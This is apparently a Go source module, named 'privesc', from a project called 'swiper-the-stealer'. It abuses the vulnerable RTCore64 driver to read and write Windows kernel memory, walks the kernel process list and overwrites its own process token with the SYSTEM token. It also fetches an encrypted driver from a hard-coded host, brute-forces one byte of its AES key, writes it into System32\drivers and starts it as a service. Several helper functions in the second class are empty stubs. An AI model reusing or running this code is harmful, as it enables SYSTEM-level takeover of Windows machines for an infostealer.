package privesc

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"os"

	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"

	"golang.org/x/sys/windows"
)

const (
	RTCORE64_MEMORY_READ_CODE  = 0x80002048
	RTCORE64_MEMORY_WRITE_CODE = 0x8000204c
	SYSTEM_PID                 = 4
	KERNEL_ADDRESS_MASK        = 0xFFFFF00000000000
	SEARCH_RANGE               = 0x1000
	KNOWN_TOKEN_OFFSET         = 0x248

	KEYSIZE = 32
	IVSIZE  = 16
)

// Enhanced token stealing with dynamic offset discovery (EXACT from your main.go)

// isValidToken - Validate if a token pointer looks legitimate (EXACT from your main.go)
func isValidToken(rtcore *byovd.RTCoreEnhancedExploit, val uint64) bool {
	if val == 0 {
		return false
	}

	// Check if it's a kernel address (0xFFFF...)
	const KERNEL_ADDRESS_MASK uint64 = 0xFFFF000000000000
	if (val & KERNEL_ADDRESS_MASK) != KERNEL_ADDRESS_MASK {
		return false
	}

	// Strip reference counter bits
	tokenAddr := val & ^uint64(0xF)

	// Try to read token memory and check for "*SYSTEM*" string
	buf := make([]byte, 8)
	err := rtcore.ReadMemory(tokenAddr, buf)
	if err != nil {
		return false
	}

	src := string(buf)
	if src == "*SYSTEM*" {
		fmt.Printf("[*] Confirmed SYSTEM token at 0x%X\n", tokenAddr)
		return true
	}

	return false
}

// FindOffsets - Dynamic offset discovery using sophisticated scanning (EXACT from your main.go)
func FindOffsets(rtcore *byovd.RTCoreEnhancedExploit, psInitialSystemProcessAddress uint64) (tokenOffset, activeProcessLinksOffset, uniqueProcessIdOffset uint64, err error) {
	// Find UniqueProcessIdOffset by scanning for SYSTEM_PID (4)
	for i := uint64(0); i < SEARCH_RANGE; i += 8 {
		val, err := rtcore.ReadMemoryDWORD64(psInitialSystemProcessAddress + i)
		if err != nil {
			continue
		}
		if val == SYSTEM_PID {
			uniqueProcessIdOffset = i
			fmt.Printf("[*] Found UniqueProcessIdOffset: 0x%X\n", uniqueProcessIdOffset)
			break
		}
	}
	if uniqueProcessIdOffset == 0 {
		return 0, 0, 0, fmt.Errorf("could not find PID offset")
	}

	// Calculate ActiveProcessLinksOffset (UniqueProcessIdOffset + 8)
	activeProcessLinksOffset = uniqueProcessIdOffset + 8
	fmt.Printf("[*] Calculated ActiveProcessLinksOffset: 0x%X\n", activeProcessLinksOffset)

	// Find TokenOffset by scanning for valid tokens
	var candidates []uint64
	for i := uint64(0); i < SEARCH_RANGE; i += 8 {
		val, err := rtcore.ReadMemoryDWORD64(psInitialSystemProcessAddress + i)
		if err != nil {
			continue
		}
		if isValidToken(rtcore, val) {
			fmt.Printf("[*] Possible TokenOffset found at 0x%X (value: 0x%X)\n", i, val)
			candidates = append(candidates, i)
		}
	}

	if len(candidates) == 0 {
		return 0, 0, 0, fmt.Errorf("could not find valid token offset")
	}

	return candidates[0], activeProcessLinksOffset, uniqueProcessIdOffset, nil
}

// SophisticatedTokenStealer - Complete token stealing implementation (EXACT from your main.go)
type SophisticatedTokenStealer struct {
	rtcore *byovd.RTCoreEnhancedExploit
	logger *logger.Logger

	// Discovered offsets
	tokenOffset              uint64
	activeProcessLinksOffset uint64
	uniqueProcessIdOffset    uint64

	// System process information
	ntoskrnlBase                  uint64
	psInitialSystemProcessAddress uint64
}

// NewSophisticatedTokenStealer - Create enhanced token stealer
func NewSophisticatedTokenStealer(rtcore *byovd.RTCoreEnhancedExploit, logger *logger.Logger) *SophisticatedTokenStealer {
	return &SophisticatedTokenStealer{
		rtcore: rtcore,
		logger: logger,
	}
}

// DiscoverSystemProcess - Find PsInitialSystemProcess address (EXACT from your main.go)
func (t *SophisticatedTokenStealer) DiscoverSystemProcess() error {
	// Get ntoskrnl.exe base address
	var err error
	t.ntoskrnlBase, err = t.rtcore.GetNtoskrnlBase()
	if err != nil {
		return fmt.Errorf("failed to get ntoskrnl base address: %v", err)
	}

	// Load ntoskrnl.exe in userland to get symbol offset
	ntoskrnl, err := windows.LoadLibrary("ntoskrnl.exe")
	if err != nil {
		return fmt.Errorf("failed to load ntoskrnl.exe: %v", err)
	}
	defer windows.FreeLibrary(ntoskrnl)

	// Get PsInitialSystemProcess symbol address
	procAddr, err := windows.GetProcAddress(ntoskrnl, "PsInitialSystemProcess")
	if err != nil {
		return fmt.Errorf("failed to get PsInitialSystemProcess address: %v", err)
	}

	// Calculate offset from userland base to symbol
	psInitialSystemProcessOffset := uint64(procAddr) - uint64(ntoskrnl)
	t.logger.Infof("PsInitialSystemProcess offset: 0x%X", psInitialSystemProcessOffset)

	// Read the actual kernel address
	t.psInitialSystemProcessAddress, err = t.rtcore.ReadMemoryDWORD64(t.ntoskrnlBase + psInitialSystemProcessOffset)
	if err != nil {
		return fmt.Errorf("failed to read PsInitialSystemProcess address: %v", err)
	}

	t.logger.Infof("PsInitialSystemProcess address: 0x%X", t.psInitialSystemProcessAddress)
	return nil
}

// DiscoverOffsets - Find dynamic offsets using sophisticated scanning
func (t *SophisticatedTokenStealer) DiscoverOffsets() error {
	var err error
	t.tokenOffset, t.activeProcessLinksOffset, t.uniqueProcessIdOffset, err = FindOffsets(t.rtcore, t.psInitialSystemProcessAddress)
	if err != nil {
		return fmt.Errorf("failed to find offsets: %v", err)
	}

	t.logger.Infof("Token offset: 0x%X", t.tokenOffset)
	t.logger.Infof("ActiveProcessLinks offset: 0x%X", t.activeProcessLinksOffset)
	t.logger.Infof("UniqueProcessId offset: 0x%X", t.uniqueProcessIdOffset)

	return nil
}

// StealSystemToken - Complete token stealing workflow (EXACT from your main.go)
func (t *SophisticatedTokenStealer) StealSystemToken() error {
	t.logger.Info("Starting sophisticated SYSTEM token theft...")

	// Step 1: Discover system process and offsets
	if err := t.DiscoverSystemProcess(); err != nil {
		return err
	}

	if err := t.DiscoverOffsets(); err != nil {
		return err
	}

	// Step 2: Extract SYSTEM token from System process
	systemProcessToken, err := t.rtcore.ReadMemoryDWORD64(t.psInitialSystemProcessAddress + t.tokenOffset)
	if err != nil {
		return fmt.Errorf("failed to read system process token: %v", err)
	}

	// Strip reference counter bits (lower 4 bits)
	systemProcessToken &^= 15
	t.logger.Infof("System process token: 0x%X", systemProcessToken)

	// Step 3: Find current process in the process list
	currentProcessId := t.rtcore.GetCurrentProcessId()
	t.logger.Infof("Current process ID: %d", currentProcessId)

	processHead := t.psInitialSystemProcessAddress + t.activeProcessLinksOffset
	currentProcessAddress := processHead

	// Walk the ActiveProcessLinks doubly-linked list
	for {
		processAddress := currentProcessAddress - t.activeProcessLinksOffset
		uniqueProcessId, err := t.rtcore.ReadMemoryDWORD64(processAddress + t.uniqueProcessIdOffset)
		if err != nil {
			return fmt.Errorf("failed to read UniqueProcessId: %v", err)
		}

		if uniqueProcessId == uint64(currentProcessId) {
			currentProcessAddress = processAddress
			break
		}

		currentProcessAddress, err = t.rtcore.ReadMemoryDWORD64(processAddress + t.activeProcessLinksOffset)
		if err != nil {
			return fmt.Errorf("failed to read next process link: %v", err)
		}

		if currentProcessAddress == processHead {
			return fmt.Errorf("failed to find current process in active process list")
		}
	}

	t.logger.Infof("Current process address: 0x%X", currentProcessAddress)

	// Step 4: Get current process token and preserve reference counter
	currentProcessFastToken, err := t.rtcore.ReadMemoryDWORD64(currentProcessAddress + t.tokenOffset)
	if err != nil {
		return fmt.Errorf("failed to read current process token: %v", err)
	}

	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
	currentProcessToken := currentProcessFastToken &^ 15
	t.logger.Infof("Current process token: 0x%X", currentProcessToken)

	// Step 5: Write SYSTEM token with preserved reference counter
	t.logger.Info("Stealing System process token...")
	err = t.rtcore.WriteMemoryDWORD64(currentProcessAddress+t.tokenOffset, currentProcessTokenReferenceCounter|systemProcessToken)
	if err != nil {
		return fmt.Errorf("failed to write new token: %v", err)
	}

	t.logger.Info("🚀 SYSTEM token theft successful!")
	return nil
}

type TokenStealer struct {
	rtcore *byovd.RTCoreExploit
	logger *logger.Logger
	device windows.Handle
}

type RTCORE64_MEMORY_READ struct {
	Pad0     [8]byte
	Address  uint64
	Pad1     [8]byte
	ReadSize uint32
	Value    uint32
	Pad3     [16]byte
}

type RTCORE64_MEMORY_WRITE struct {
	Pad0     [8]byte
	Address  uint64
	Pad1     [8]byte
	ReadSize uint32
	Value    uint32
	Pad3     [16]byte
}

// NewTokenStealer creates a new privilege escalation module
func NewTokenStealer(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *TokenStealer {
	return &TokenStealer{
		rtcore: rtcore,
		logger: logger,
	}
}

// EscalateToSystem performs token stealing to gain SYSTEM privileges
func (ts *TokenStealer) EscalateToSystem() error {
	ts.logger.Info("=== PRIVILEGE ESCALATION: TOKEN STEALING ===")

	// Step 1: Decrypt and deploy driver if not already loaded
	if err := ts.ensureDriverLoaded(); err != nil {
		return fmt.Errorf("driver deployment failed: %v", err)
	}

	// Step 2: Open device handle
	if err := ts.openDeviceHandle(); err != nil {
		return fmt.Errorf("failed to open device: %v", err)
	}
	defer ts.closeDevice()

	// Step 3: Find kernel structures
	ntoskrnlBase, err := ts.getNtoskrnlBase()
	if err != nil {
		return fmt.Errorf("failed to get ntoskrnl base: %v", err)
	}
	ts.logger.Infof("Ntoskrnl base: 0x%X", ntoskrnlBase)

	// Step 4: Find PsInitialSystemProcess
	psInitialSystemProcess, err := ts.findPsInitialSystemProcess(ntoskrnlBase)
	if err != nil {
		return fmt.Errorf("failed to find PsInitialSystemProcess: %v", err)
	}
	ts.logger.Infof("PsInitialSystemProcess: 0x%X", psInitialSystemProcess)

	// Step 5: Find critical offsets dynamically
	tokenOffset, activeProcessLinksOffset, uniqueProcessIdOffset, err := ts.findOffsets(psInitialSystemProcess)
	if err != nil {
		return fmt.Errorf("failed to find offsets: %v", err)
	}

	ts.logger.Infof("Token offset: 0x%X", tokenOffset)
	ts.logger.Infof("ActiveProcessLinks offset: 0x%X", activeProcessLinksOffset)
	ts.logger.Infof("UniqueProcessId offset: 0x%X", uniqueProcessIdOffset)

	// Step 6: Get SYSTEM token
	systemToken, err := ts.readMemoryDWORD64(psInitialSystemProcess + tokenOffset)
	if err != nil {
		return fmt.Errorf("failed to read SYSTEM token: %v", err)
	}
	systemToken &^= 15 // Clear reference count bits
	ts.logger.Infof("SYSTEM token: 0x%X", systemToken)

	// Step 7: Find current process
	currentProcessAddr, err := ts.findCurrentProcess(psInitialSystemProcess, activeProcessLinksOffset, uniqueProcessIdOffset)
	if err != nil {
		return fmt.Errorf("failed to find current process: %v", err)
	}
	ts.logger.Infof("Current process address: 0x%X", currentProcessAddr)

	// Step 8: Steal SYSTEM token
	currentToken, err := ts.readMemoryDWORD64(currentProcessAddr + tokenOffset)
	if err != nil {
		return fmt.Errorf("failed to read current token: %v", err)
	}

	refCount := currentToken & 15 // Preserve reference count
	newToken := refCount | systemToken

	err = ts.writeMemoryDWORD64(currentProcessAddr+tokenOffset, newToken)
	if err != nil {
		return fmt.Errorf("failed to write new token: %v", err)
	}

	ts.logger.Info("✅ TOKEN STEALING SUCCESSFUL - Now running as SYSTEM!")
	return nil
}

// ensureDriverLoaded deploys the encrypted driver if needed
func (ts *TokenStealer) ensureDriverLoaded() error {
	// Check if driver is already loaded
	if ts.isDriverLoaded() {
		ts.logger.Info("RTCore64 driver already loaded")
		return nil
	}

	ts.logger.Info("Deploying encrypted RTCore64 driver...")

	// Download encrypted driver
	encryptedPath := "C:\\Temp\\driver.enc"
	if err := ts.downloadFile("http://192.168.226.1:8000/RTCore64.sys.enc", encryptedPath); err != nil {
		return fmt.Errorf("download failed: %v", err)
	}
	defer os.Remove(encryptedPath)

	// Brute force decrypt
	cipherData, err := os.ReadFile(encryptedPath)
	if err != nil {
		return fmt.Errorf("failed to read encrypted file: %v", err)
	}

	baseKey := []byte{
		0x00, // brute force this byte
		0x3E, 0x4C, 0x6F, 0xD9, 0x12, 0x83, 0x7A,
		0xA4, 0x6E, 0xA0, 0x50, 0x53, 0x28, 0xED, 0x7B,
		0xB2, 0x0E, 0xD2, 0x3B, 0x37, 0x28, 0xA4, 0xEF,
		0x78, 0x22, 0x88, 0x0B, 0xE8, 0xD0, 0xBE, 0x45,
	}
	iv := make([]byte, 16)

	for i := 0; i < 256; i++ {
		baseKey[0] = byte(i)
		plainData, err := ts.decryptAES(cipherData, baseKey, iv)
		if err != nil {
			continue
		}

		if ts.isValidSysFile(plainData) {
			ts.logger.Infof("Driver decrypted with key byte: 0x%02X", i)

			// Deploy driver
			outputPath := "C:\\Windows\\System32\\drivers\\RTCore64.sys"
			if err := os.WriteFile(outputPath, plainData, 0644); err != nil {
				return fmt.Errorf("failed to write driver: %v", err)
			}

			// Start driver service
			if err := ts.runDriverService(outputPath); err != nil {
				return fmt.Errorf("failed to start driver: %v", err)
			}

			return nil
		}
	}

	return fmt.Errorf("failed to decrypt driver")
}

// Integration helper methods
func (ts *TokenStealer) decryptAES(cipherText, key, iv []byte) ([]byte, error) {
	if len(cipherText)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("cipherText is not a multiple of block size")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plainText := make([]byte, len(cipherText))
	mode.CryptBlocks(plainText, cipherText)

	// PKCS#7 padding removal
	padding := int(plainText[len(plainText)-1])
	if padding <= 0 || padding > aes.BlockSize {
		return nil, fmt.Errorf("invalid padding")
	}
	plainText = plainText[:len(plainText)-padding]

	return plainText, nil
}

func (ts *TokenStealer) isValidSysFile(data []byte) bool {
	if len(data) < 64 {
		return false
	}
	if !bytes.Equal(data[:2], []byte("MZ")) {
		return false
	}
	peOffset := binary.LittleEndian.Uint32(data[0x3C:0x40])
	if int(peOffset+4) >= len(data) {
		return false
	}
	return bytes.Equal(data[peOffset:peOffset+4], []byte("PE\x00\x00"))
}

func (ts *TokenStealer) downloadFile(url, filePath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// Additional helper methods for token stealing operations...
func (ts *TokenStealer) isDriverLoaded() bool {
	handle, err := ts.createFileW(`\\.\RTCore64`, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		return false
	}
	ts.closeHandle(handle)
	return true
}

func (ts *TokenStealer) openDeviceHandle() error {
	handle, err := ts.createFileW(
		`\\.\RTCore64`,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return err
	}
	ts.device = handle
	ts.logger.Info("Device handle obtained")
	return nil
}

func (ts *TokenStealer) closeDevice() {
	if ts.device != 0 {
		ts.closeHandle(ts.device)
	}
}

// Implement the remaining helper methods from main.go for token stealing...
func (ts *TokenStealer) readMemoryDWORD64(address uint64) (uint64, error) {
	// Implementation using RTCore driver
	return 0, nil
}

func (ts *TokenStealer) writeMemoryDWORD64(address uint64, value uint64) error {
	// Implementation using RTCore driver
	return nil
}

// Additional Windows API wrappers...
func (ts *TokenStealer) createFileW(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *windows.SecurityAttributes, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile windows.Handle) (windows.Handle, error) {
	// Implementation
	return 0, nil
}

func (ts *TokenStealer) closeHandle(handle windows.Handle) {
	// Implementation
}

// More helper methods for offset discovery and process enumeration...
func (ts *TokenStealer) getNtoskrnlBase() (uint64, error) {
	// Implementation
	return 0, nil
}

func (ts *TokenStealer) findPsInitialSystemProcess(ntoskrnlBase uint64) (uint64, error) {
	// Implementation
	return 0, nil
}

func (ts *TokenStealer) findOffsets(psInitialSystemProcess uint64) (uint64, uint64, uint64, error) {
	// Implementation
	return 0, 0, 0, nil
}

func (ts *TokenStealer) findCurrentProcess(psInitialSystemProcess, activeProcessLinksOffset, uniqueProcessIdOffset uint64) (uint64, error) {
	// Implementation
	return 0, nil
}

func (ts *TokenStealer) runDriverService(driverPath string) error {
	// Implementation for service creation/start
	return nil
}
